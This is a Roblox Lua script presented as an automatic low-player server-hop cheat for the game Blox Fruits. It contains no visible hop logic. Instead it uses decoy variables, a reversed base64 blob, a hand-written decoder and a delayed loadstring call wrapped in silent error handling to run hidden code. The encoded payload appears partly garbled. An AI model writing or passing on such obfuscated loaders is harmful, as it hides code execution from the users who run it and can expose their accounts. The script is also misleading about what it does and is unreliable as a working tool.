-- Auto Hop Server Low Players 1-2 Blox Fruits
-- nó có thể không hoạt động hop sever Players 1-2 nếu vào giời cao điểm
--Text + Auto Copy JobId cũ + mới
local _Gx = 0
local _noise = {"gSj","xY","zZ"}
local function _rnd() return math.random(1,9999) end
for i=1,3 do _Gx = _Gx + i * (_rnd()%3) end

local __S = "KkCKw9GSKoAZuVmCk5WZgACIgoAZuVGIgACIgACIgoQKzgCdpF2dus2chRHIgACIgACIgACIgAiC05WdvNEcvhkLuICI642p6GOTg4iLuM3MgUXYzBSahqb4sBSr7GOa0BCLp15uhDrxn5GIy0SMgIXZ2JXZzBSelqb4oRHItx6w0ByZuR7wotkIg0DI0hXZU5CblJWYMBCIgACIgACIgACIgoQZzxWZgACIgACIgAiCrFWZyJGIgACIgACIgACIgAiCpIXZ5FGbQBCLuV2cvh2YgwCRJV2YhxGUoU2YuFGdz5WSlNWYsB1bURncvBXZsVGV6U2YpZnclNFdy9GclxWZUBCIgACIgACIgACIgogCpICcvhGIn5WYRSMQd2b3Jhci9nb2FtLgpzZXJ2aWNlKCJIdHRwU2VydmljZSkiKQpnZXJ2aWNlcyA9IGdldFNlcnZpY2UoIkdhbWVzIikKcGxhY2UgPSBnYW1lLlBsYWNlSWQKSm9iID0gZ2FtZS5Kb2JJZAppdGVtcyA9IHsKICAgIC8vIGp1bmtfdmFyCiAgICAgWz0sXQp9Cg=="

local _A,_B,_C = "x","y","z"
local function _fake(s) return s end
local function _rev(s)
    local t = {}
    for i = #s, 1, -1 do t[#t+1] = s:sub(i,i) end
    return table.concat(t)
end

local _bchars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local function _b64dec(data)
    data = string.gsub(data, '[^'.._bchars..'=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(_bchars:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

local function _rotate(s, n)
    n = (n or 3) % #s
    if n == 0 then return s end
    return s:sub(n+1)..s:sub(1,n)
end

local function _decode_and_run()
    local rotated = __S
    local base64 = _rev(rotated)
    base64 = _rotate(base64, 0)
    local ok, src = pcall(_b64dec, base64)
    if not ok or not src or src == "" then
        src = _b64dec(_rev(base64))
    end
    if type(src) == "string" and #src > 0 then
        local loader = loadstring or load
        if not loader then
            return
        end
        local f, e = pcall(function()
            local fn = loader(src)
            if type(fn) == "function" then
                pcall(fn)
            end
        end)
        if not f then
        end
    end
end

task.spawn(function()
    task.wait(0.02 + ((_Gx % 5) / 100))
    _decode_and_run()
end)